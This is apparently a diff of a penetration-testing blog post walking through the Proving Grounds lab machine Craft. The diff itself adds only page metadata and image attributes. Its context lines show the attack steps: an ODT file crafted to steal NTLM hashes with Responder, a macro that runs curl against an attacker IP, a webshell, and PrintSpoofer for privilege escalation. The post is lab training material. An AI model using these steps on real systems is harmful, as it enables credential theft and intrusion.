@@ -3,6 +3,18 @@
 <head>
     <meta charset="utf-8">
     <title>PG: Craft | HackWithJordan</title>
+    <!-- site-meta -->
+    <meta name="description" content="Walkthrough of the Proving Grounds machine Craft, from first foothold to full compromise.">
+    <link rel="canonical" href="https://hackwithjordan.com/posts/2025-03-01-Craft(PG).html">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="HackWithJordan">
+    <meta property="og:title" content="PG: Craft">
+    <meta property="og:description" content="Walkthrough of the Proving Grounds machine Craft, from first foothold to full compromise.">
+    <meta property="og:url" content="https://hackwithjordan.com/posts/2025-03-01-Craft(PG).html">
+    <meta property="og:image" content="https://hackwithjordan.com/assets/room/poster.jpg">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta property="article:published_time" content="2025-03-01">
+    <!-- /site-meta -->
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" href="../assets/css/syntax.css">
     <style>
@@ -306,7 +318,7 @@
 
         <p>Uploading a random file shows us only ODT files are allow</p>
 
-        <img alt="Screenshot 2" height="183" src="../img/posts/2025-03-01-Craft(PG)/02-b0150958f8.png" style="aspect-ratio:685/183;" width="685"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 2" height="183" src="../img/posts/2025-03-01-Craft(PG)/02-b0150958f8.png" style="aspect-ratio:685/183;" width="685"/>
 
         <p>Using this script above or this website we can manually create an exploit to steal the NTLM creds of whoever opens the file</p>
 
@@ -316,7 +328,7 @@
 
         <p>Run responder and we capture the hash for thecybergeek</p>
 
-        <img alt="Screenshot 3" height="441" src="../img/posts/2025-03-01-Craft(PG)/03-f7c150eac8.png" style="aspect-ratio:1749/441;" width="1749"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 3" height="441" src="../img/posts/2025-03-01-Craft(PG)/03-f7c150eac8.png" style="aspect-ratio:1749/441;" width="1749"/>
 
         <p>We cant get this hash to crack so im going to look for other exploits. I remembered doing a similar machine for Hack The Box a while back called Mailing which involved creating a malicious ODT file with an embedded macro which allowed RCE.</p>
 
@@ -332,11 +344,11 @@
 
         <p>“Incorrect” command - <code>Shell("cmd /c 'curl http://192.168.45.231/RCECONFIRMED'")</code></p>
 
-        <img alt="Screenshot 4" height="146" src="../img/posts/2025-03-01-Craft(PG)/04-91455a29f3.png" style="aspect-ratio:459/146;" width="459"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 4" height="146" src="../img/posts/2025-03-01-Craft(PG)/04-91455a29f3.png" style="aspect-ratio:459/146;" width="459"/>
 
         <p>Once I solved that I uploaded it to the site and got a shell and callback from the curl command.</p>
 
-        <img alt="Screenshot 5" height="1118" src="../img/posts/2025-03-01-Craft(PG)/05-503b3fdd37.png" style="aspect-ratio:1198/1118;" width="1198"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 5" height="1118" src="../img/posts/2025-03-01-Craft(PG)/05-503b3fdd37.png" style="aspect-ratio:1198/1118;" width="1198"/>
 
         <h1 style="color:#5eead4;">Shell as Apache</h1>
 
@@ -350,11 +362,11 @@
 
         <p>http://192.168.110.169/webshell.php</p>
 
-        <img alt="Screenshot 6" height="216" src="../img/posts/2025-03-01-Craft(PG)/06-209f7006a0.png" style="aspect-ratio:971/216;" width="971"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 6" height="216" src="../img/posts/2025-03-01-Craft(PG)/06-209f7006a0.png" style="aspect-ratio:971/216;" width="971"/>
 
         <p>Getting a shell using the same powershell method above and we have SeImpersonate</p>
 
-        <img alt="Screenshot 7" height="1065" src="../img/posts/2025-03-01-Craft(PG)/07-744bb94edb.png" style="aspect-ratio:1514/1065;" width="1514"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 7" height="1065" src="../img/posts/2025-03-01-Craft(PG)/07-744bb94edb.png" style="aspect-ratio:1514/1065;" width="1514"/>
 
         <h1 style="color:#5eead4;">Shell as Administrator</h1>
 
@@ -364,11 +376,11 @@
 
         <pre class="terminal"><code>.\PrintSpoofer.exe -i -c cmd</code></pre>
 
-        <img alt="Screenshot 8" height="507" src="../img/posts/2025-03-01-Craft(PG)/08-6eb560c535.png" style="aspect-ratio:944/507;" width="944"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 8" height="507" src="../img/posts/2025-03-01-Craft(PG)/08-6eb560c535.png" style="aspect-ratio:944/507;" width="944"/>
 
         <p>Now we can grab the final flag and finish out this machine.</p>
 
-        <img alt="Screenshot 9" height="269" src="../img/posts/2025-03-01-Craft(PG)/09-63a277ebc3.png" style="aspect-ratio:507/269;" width="507"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 9" height="269" src="../img/posts/2025-03-01-Craft(PG)/09-63a277ebc3.png" style="aspect-ratio:507/269;" width="507"/>
     </article>
 
 <script>
